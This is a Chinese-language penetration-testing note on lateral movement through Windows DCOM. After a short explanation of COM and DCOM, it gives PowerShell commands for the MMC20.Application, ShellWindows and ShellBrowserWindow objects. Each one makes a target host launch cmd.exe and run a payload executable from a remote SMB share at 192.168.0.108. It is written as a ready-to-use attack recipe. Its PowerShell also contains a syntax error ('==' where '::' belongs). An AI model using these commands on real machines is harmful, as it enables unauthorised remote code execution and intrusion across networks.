# DCOM利用

**关于COM(组件对象模型)**

* 微软一套软件组件的二进制接口标准，使得跨编程语言的进程间通信
* COM是多项微软技术与框架的基础，如OLE、OLE自动化、ActiveX、COM+、Windows shell、DCOM、DirectX
* COM由一组构造规范和组件对象库组成
* 在Win中COM对象都由唯一的128位二进制标识符标识，即GUID
* 当GUID用于标识COM对象时，被称为GLSID(类标识符)
* 当GUID用于标识接口时，被称为IID(接口标识符)
* 一些GLSID还具有ProgID

**关于DCOM(分布式组件对象模型)**

* 基于COM，为COM的扩展
* 允许程序实例化和访问另一台计算机上的COM对象属性和方法
* DCOM使用远程过程调用RPC技术将COM功能扩展到本地计算机之外
* 远程服务器托管COM服务器端的软件(DLL/EXE)可以通过RPC向客户端公开

**DCOM的横向移动**

* 部分DCOM组件公开的接口中可能包含不安全的方法
* 常利用的DCOM组有：MMC20.Application、ShellWindows、EXcel.Application、ShellBrowserWindow等

ps下列出计算机所有的DCOM组件

```
Get-CimInstance Win32_DCOMApplication
```

**MMC20.Application**

* MMC20.Application对象的Document.ActiveView存在一个ExecuteShellCommand方法，可以用于启动子进程并运行执行的程序或系统命令 通过ProgID与DCOM进行远程交互，并创建MMC20.Application对象实例

```
$COM = [activator]==CreateInstance([type]==GetTypeFromProgID("MMC20.Application","192.168.0.106"))
```

调用ExecuteShellCommand方法启动进程，运行攻击载荷(调用过程中MMC20.Application会在远程主机上启动mmc.exe进程，通过ExecuteShellCommand方法在mmc.exe中创建子进程)

```
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c \\192.168.0.108\lbwnb\0.108.9876.exe","Minimized")
```

**ShellWindows**

* ShellWindows组件提供了Document.Application.ShellExecute方法，可以用于启动子进程来运行指定的程序或系统命令，适用于Window7以上版本的系统
* 由于ShellWindows对象没有ProgID,所以需要手动去OleViewDotNet工具上去找到ShellWindows对象的CLSID
* OleViewDotNet:https://github.com/tyranid/oleviewdotnet/releases/tag/v1.11
* ShellWindows CLSID: 9ba05972-f6a8-11cf-a442-00a0c90a8f39 - ShellWindows 管理员权限PS通过CLSID与DCOM进行远程交互，并创建ShellWindows对象实例

```
$COM = [activator]==CreateInstance([type]==GetTypeFromCLSID("9ba05972-f6a8-11cf-a442-00a0c90a8f39","192.168.0.106"))
```

ShellWindowx并不会创建新进程，而是在有explorer.exe进程中创建并执行子进程

```
$com.item().Document.Application.ShellExecute('cmd.exe',"/c \\192.168.0.108\lbwnb\0.108.9876.exe","C:\Windows\System32",$null,0)
```

**ShellBrowserWindow**

* ShellBrowserWindow中也存在一个Document.Application.ShellExecute方法，与ShellWindows一样，但不会创建新进程，而是通过已有的explorer.exe托管子进程，该方法只适用于Windos10和Windows Server2012等版本的系统
* c08afd90-f2a1-11d1-8455-00a0c91f3880 - ShellBrowserWindow

```
管理员权限PS通过CLSID与DCOM进行远程交互，并创建ShellBrowserWindows对象实例
$COM = [activator]==CreateInstance([type]==GetTypeFromCLSID("c08afd90-f2a1-11d1-8455-00a0c91f3880","192.168.0.104"))
```

调用ShellExecute方法启动子进程

```
$com.Document.Application.ShellExecute('cmd.exe',"/c \\192.168.0.108\lbwnb\0.108.9876.exe","C:\Windows\System32",$null,0)
```
